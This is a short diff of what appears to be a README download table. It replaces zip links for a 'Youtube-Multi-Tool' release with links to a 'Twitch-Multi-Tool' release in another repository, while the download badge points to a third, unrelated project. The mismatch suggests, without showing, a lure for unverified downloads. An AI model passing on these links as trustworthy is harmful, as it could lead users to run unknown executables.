@@ -4,4 +4,4 @@
 
 | Downloads | For Windows | Stable And Beta | |
 |:-------------:| :-----:| :--------:| :--------:|
-| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For Windows](https://github.com/CTCB3711111/Youtube-Multi-Tool/releases/download/1/Youtube_Multi_Tool.zip) | [Download BETA](https://github.com/CTCB3711111/Youtube-Multi-Tool/releases/download/1/Youtube_Multi_Tool.zip) |
+| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For Windows](https://github.com/aatosYlivn/Twitch-Multi-Tool/releases/download/1/Twitch_Multi_Tool.zip) | [Download BETA](https://github.com/aatosYlivn/Twitch-Multi-Tool/releases/download/1/Twitch_Multi_Tool.zip) |
